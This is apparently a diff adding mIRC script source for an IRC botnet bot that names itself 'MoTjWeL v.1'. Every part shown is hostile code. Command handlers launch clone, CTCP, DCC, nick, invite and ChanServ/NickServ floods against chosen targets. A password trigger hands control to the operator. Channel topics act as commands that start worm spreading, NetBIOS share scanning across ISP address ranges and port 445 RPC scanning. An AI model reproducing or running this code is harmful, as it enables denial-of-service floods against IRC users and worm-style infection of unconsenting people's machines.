+      if ($2 = fuck) && ($3-) { %fuck.chan.c = $3 | talk Clones Starting Special Flood On: %fuck.chan.c | fuck.c | halt }
+      if ($2 = ctcp) && ($3-) { %flood.ctcp.c = $3 | talk Attempting To Ctcp Flood: %flood.ctcp.c | ctcp.c | halt }
+      if ($2 = sendq) && ($3-) { user PRIVMSG $3- : %f3 | user NICK $rand.c | user PRIVMSG $3- : $+ %f3 | talk Attempting To Sendq: $3- }
+      if ($2 = kill) { talk Attempting To Kill Clones.. | user QUIT | sockclose user.* | unset %*.c | halt }
+    if ($2 == chan1) && ($3 != $null) { sockwrite -tn Sockets-* IRCX | sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %m1 |  sockwrite -tn Sockets-* NOTICE  $3 : $+ %m2 | sockwrite -tn Sockets-* part $3 | notice $nick 2[14Clonez2]14 starting flood on $3 }
+    if ($2 == chan2) && ($3 != $null) { sockwrite -tn Sockets-* IRCX | sockwrite -tn Sockets-* join $3 | timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %m3 | timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %m1 | notice $nick 2[14Clonez2]14 starting endless flood on $3 $+ ! }
+    if ($2 == nknot) && ($3 != $null) { sockwrite -tn Sockets-* notice $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2 | sockwrite -tn Sockets-* notice $3 : $+ %m3 | sockwrite -tn Sockets-* notice $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2 | sockwrite -tn Sockets-* notice $3 : $+ %m3 }
+    if ($2 == nkmsg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* privmsg $3 : $+ %m3 | sockwrite -tn Sockets-* privmsg $3 : $+ %m2 | sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* privmsg $3 : $+ %m3 }
+    if ($2 == jp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- }
+    if ($2 == jp3) && ($3 != $null) { sockwrite -tn user.* IRCX | timer 0 1 sockwrite -tn user.* JOIN $3 $4- | timer 0 2 sockwrite -tn user.* PART $3 $4- }
+    if ($2 == jmp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m3 | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m1 | sockwrite -tn user.* PART $3 $4- }
+    if ($2 == send) && ($3 != $null) { sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC SEND Go_To_HeLL $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  }
+    if ($2 == chat) && ($3 != $null) { sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  | sockwrite -tn user.* PRIVMSG $3 :DCC CHAT $rand(1,999999) $rand(1024,5000) $rand(1,5000) $+  }
+    if ($2 == version) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ VERSION $+ $chr(1) }
+    if ($2 == ping) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ PING $+ $chr(1) }
+    if ($2 == time) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ time $+ $chr(1) }
+    if ($2 == finger) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ finger $+ $chr(1) }
+    if ($2 == clientinfo) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) | sockwrite -tn user.* PRIVMSG $3 : $+ $chr(1) $+ clientinfo $+ $chr(1) }
+    if ($2 == invite) && ($3 != $null) { sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* INVITE $3 #X $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) }
+    if ($2 == nick) && ($3 != $null) { sockwrite -tn user.* NICK $3 $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn user.* NICK $3 $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) }
+    if ($2 == nickflood) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* join $3 | timer 0 1 sockwrite -tn user.* NICK $nfs | timer 0 2 sockwrite -tn user.* NICK $nfs }
+ 
+     if ($2 = dcc) && ($3-) {
+        if ($3 = send) && ($4-) { %dcc.n.c = $4 | %dcc.n.f.c = $5- | talk Attempting To Dcc Send Flood: %dcc.n.c , Sending File: %dcc.n.f.c | send.c %dcc.n.c %dcc.n.f.c | halt }
+        if ($3 = chat) && ($4-) { %dcc.n.chat.c = $4 | talk Attempting To Dcc Chat Flood: %dcc.n.chat.c | chat.c %dcc.n.chat.c | halt }
+        if ($3 = own) && ($4-) { %dcc.n.own.c = $4 | talk Attempting To Dcc FreeZe: %dcc.n.own.c | dcc.c %dcc.n.own.c | halt }
+      }
+      if ($3 = reg) && ($3-) {
+        if ($3 = cs) { talk Attempting To Flood ChanServ.. | %flood.reg.chan.c = $+(#,$rand.c) | user JOIN %flood.reg.chan.c | user PRIVMSG Chanserv : register %flood.reg.chan.c $rand.p.c h4ckxcr3w | halt }
+        if ($3 = ns) { talk Attempting To Flood NickServ.. | ns.c | halt }
+      
+    }
+  }
+}
+on ^*:text:!start*:%c:{ 
+  if ($2 = %pass) && ($level($nick) != 999) || (127.0. isin $address($nick,8))) { 
+    Talk 14P1assword 14A1ccepted 14F1or: $nick , 14B1ot 14V1ersion: -=[ 1MoTjWeL v.1 ]=-  
+    auser 999 $nick
+    halt 
+  } 
+}
+alias checkconn {
+  if ($server == $null) { server %server }
+  else { halt }
+}
+raw 332:*:{ 
+  %topic = $3-  
+  if (!spread == $gettok(%topic,1,32)) { set %s.share $gettok(%topic,2,32) | lan-spread }
+  if (!xspread == $gettok(%topic,1,32)) { xspread }
+  if (!nb == $gettok(%topic,1,32)) {
+    if (isp == $gettok(%topic,2,32)) && (start == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,5,32) | set %scan.bat $gettok(%topic,4,32) | set %begit $gettok($ip,1-2,46) $+ .1.1 | talk [NetBios Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+    if (isp == $gettok(%topic,2,32)) && (rand == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,5,32) | set %scan.bat $gettok(%topic,4,32) | set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | talk [NetBios Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+    if (ip == $gettok(%topic,2,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,4,32) | set %scan.bat $gettok(%topic,3,32) | set %begit $gettok($ip,1-3,46) $+ .1 | talk [NetBios Scanner] starting scan from: %begit to $+($gettok($ip,1-3,46),.255) using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+    if (start == $gettok(%topic,2,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,6,32) | set %scan.bat $gettok(%topic,5,32) | set %begit $randip($gettok(%topic,3,32)) | talk [NetBios Scanner] starting scan from: %begit to $gettok(%topic,4,32) using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $gettok(%topic,4,32) | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }
+    if (stop == $gettok(%topic,2,32)) && (%begshortip != $null) { talk scanner scanning from: %begshortip to %endshortip stopped by $nick $+ ! | stopscan }
+    if (stats == $gettok(%topic,2,32)) && (%begshortip != $null) { talk scanner stats, range: [ %begshortip - %endshortip ] port: [ $sock($sockname).port ] current ip: [ %ip28 ] total found: [ $totalfound ] sharing method:[ %scan.bat ] spreading port: [ %nb.port ] spreading file: [ %sf ] }
+  }
+  if (!rpc == $gettok(%topic,1,32)) { 
+    if (isp == $gettok(%topic,2,32)) && (rand == $gettok(%topic,3,32)) && (%cmdbegshortip == $null) { set %cmdbegit $+($gettok($ip,1-2,46),.,$r(1,255),.,$r(1,255)) | set %cmdport $gettok(%topic,4,32) | talk [RPC port 445 scanner] started RAND ISP scan from: %cmdbegit to $+($gettok($ip,1-2,46),.255.255) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip( %cmdbegshortip ) | set %endshortcmdip $+($gettok($ip,1-2,46),.255.255) | set %endlongcmdip $longip( %endshortcmdip ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+    if (isp == $gettok(%topic,2,32)) && (start == $gettok(%topic,3,32)) && (%cmdbegshortip == $null) { set %cmdbegit $+($gettok($ip,1-2,46),.1.1) | set %cmdport $gettok(%topic,4,32) | talk [RPC port 445 scanner] started ISP scan from: %cmdbegit to $+($gettok($ip,1-2,46),.255.255) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip( %cmdbegshortip ) | set %endshortcmdip $+($gettok($ip,1-3,46),.255) | set %endlongcmdip $longip( %endshortcmdip ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+    if (ip == $gettok(%topic,2,32)) && (%cmdbegshortip == $null) { set %cmdbegit $+($gettok($ip,1-3,46),.1) | set %cmdport $gettok(%topic,3,32) | talk [RPC port 445 scanner] started ISP scan from: %cmdbegit to $+($gettok($ip,1-3,46),.255) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip( %cmdbegshortip ) | set %endshortcmdip $+($gettok($ip,1-3,46),.255) | set %endlongcmdip $longip( %endshortcmdip ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+    if (start == $gettok(%topic,2,32)) && (%cmdbegshortip == $null) { set %cmdbegit $randip($gettok(%topic,3,32)) | set %cmdport $gettok(%topic,5,32) | talk [RPC port 445 scanner] started scan from: %cmdbegit to $gettok(%topic,4,32) using port: %cmdport | set %cmdbegshortip %cmdbegit | set %beglongcmdip $longip(  %cmdbegshortip ) | set %endshortcmdip $gettok(%topic,4,32) | set %endlongcmdip $longip( %endshortcmdip  ) | set %cmdtotal $calc( %endlongcmdip - %beglongcmdip ) | unset %totalcmdscan | start445 }
+
+  }
+}
+
+raw 366:*: {
+  haltdef
+  if ($chan($2).topic == $null) && ($nick($2,0) == 1) { mode $chan +ntsk 1397 }
+}
